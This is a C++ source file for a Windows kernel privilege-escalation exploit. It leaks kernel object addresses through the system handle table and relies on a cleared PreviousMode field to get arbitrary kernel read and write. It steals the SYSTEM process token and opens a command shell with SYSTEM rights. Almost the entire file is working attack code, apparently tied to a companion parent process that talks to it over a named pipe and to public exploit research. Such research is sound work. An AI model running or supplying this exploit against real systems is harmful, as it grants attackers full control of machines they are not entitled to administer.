#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#include "Header.hpp"
#include "Hexdump.hpp"

#pragma comment(lib, "ntdll.lib")

#define TOKEN_OFFSET 0x4b8
#define PREVIOUS_MODE_OFFSET_KTHREAD 0x232


void arbitraryRead(PVOID addr, QWORD size, PVOID out) {
	BOOLEAN status = ReadProcessMemory(GetCurrentProcess(), addr, out, size, NULL);
	if (status) {
		printf("[*] Read from: 0x%p\n", addr);
		std::cout << Hexdump(out, size) << std::endl;
	}
	else {
		puts("[!] Failed to read");
	}
}

void arbitraryWrite(PVOID addr, char* data, QWORD size) {
	// Can't use WriteProcessMemory() directly because internally, it calls NtQueryVirtualMemory()
	// NtQueryVirtualMemory() will checks if our address is > 0x7FFFFFFEFFFF (usermode address limit) regardless of PreviousMode on Ethread
	// Use NtWriteVirtualMemory() directly. Ref: https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdStackOverflowRopMI.cpp#L47
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");

	NTSTATUS status = pNtWriteVirtualMemory(GetCurrentProcess(), addr, data, size, NULL);
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed to write to: 0x%llx. Error: 0x%llx\n", addr, status);
	}
}

PVOID leakKernelObjectAddr(HANDLE handle, DWORD pid) {
	NTSTATUS status;
	SYSTEM_HANDLE_INFORMATION localHandleInfoObj;
	PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
	ULONG handleInfoSize = 0;
	PVOID result = NULL;

	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, &handleInfoSize)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (handleInfo != NULL)
		{
			handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfo, 2 * handleInfoSize);
		}

		else
		{
			handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * handleInfoSize);
		}
	}
	if (status != STATUS_SUCCESS) {
		printf("Can't query handle table. Error: %llx\n", status);
		HeapFree(GetProcessHeap(), 0, handleInfo);
		return NULL;
	}

	for (int i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		// Check if this is the correct handle
		if ((handleInfo->Handles[i].UniqueProcessId == pid)) {
			if (((HANDLE)handleInfo->Handles[i].HandleValue == handle)) {
				//printf("[*] Found object address: 0x%p\n", handleInfo->Handles[i].Object);
				//printf("%hhd\n", handleInfo->Handles[i].ObjectTypeIndex);
				result = handleInfo->Handles[i].Object;
				break;
			}
		}
	}
	HeapFree(GetProcessHeap(), 0, handleInfo);
	return result;
}

int exploit() {
	NTSTATUS status;
	HRESULT result;
	BOOLEAN boolStat;
	PVOID systemEprocess, targetEprocess;
	char cleanup = 1;

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread) {
		puts("[!] Failed to get current thread handle");
		return 1;
	}
	PVOID eThreadAddr = leakKernelObjectAddr(hThread, GetCurrentProcessId());
	printf("[*] Leaked _ETHREAD: %p\n", eThreadAddr);
	if (eThreadAddr == NULL) {
		puts("[!] Failed to leak ETHREAD");
		return 1;
	}
	QWORD targetAddr = (QWORD)eThreadAddr + PREVIOUS_MODE_OFFSET_KTHREAD;
	systemEprocess = leakKernelObjectAddr((HANDLE)4, 4);
	targetEprocess = leakKernelObjectAddr(hProc, GetCurrentProcessId());
	if (!systemEprocess || !targetEprocess) {
		puts("[!] Failed to leak EPROCESS structs");
		arbitraryWrite((PVOID)targetAddr, &cleanup, 1);
		return 1;
	}
	// Swap token
	char token[8];
	arbitraryRead((char*)systemEprocess + TOKEN_OFFSET, 8, token);
	arbitraryWrite((char*)targetEprocess + TOKEN_OFFSET, token, 8);
	// According to: https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdStackOverflowRopMI.cpp#L139 and debugging
	// If we start a new process with PreviousMode still 0, there will be an access violation exception	
	// Exception happens at >>> PspLocateInPEManifest+0x9b: bts     dword ptr [rax+8],0Dh
	arbitraryWrite((PVOID)targetAddr, &cleanup, 1);
	system("cmd");

EXIT:
	CloseHandle(hThread);
	CloseHandle(hProc);
}

int main()
{
	puts("[*] Leak process started");
	HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\leakPipe1", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 0, 0, 0, NULL);
	BOOL stat = ConnectNamedPipe(hPipe, NULL);
	if (!stat) {
		puts("[!] Cant connect named pipe");
		return 1;
	}
	puts("[*] Parent connected");
	while (true) {
		int command;
		ReadFile(hPipe, &command, sizeof(command), NULL, NULL);
		if (command == 1) {
			HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
			PVOID objAddr = leakKernelObjectAddr(hThread, GetCurrentProcessId());
			printf("Response: %p\n", objAddr);
			WriteFile(hPipe, &objAddr, sizeof(objAddr), NULL, NULL);
		}
		else if (command == 2) {
			DisconnectNamedPipe(hPipe);
			CloseHandle(hPipe);
			break;
		}
	}
	// Child can write at kernel address now
	puts("[*] Start swapping token");
	exploit();
	
}
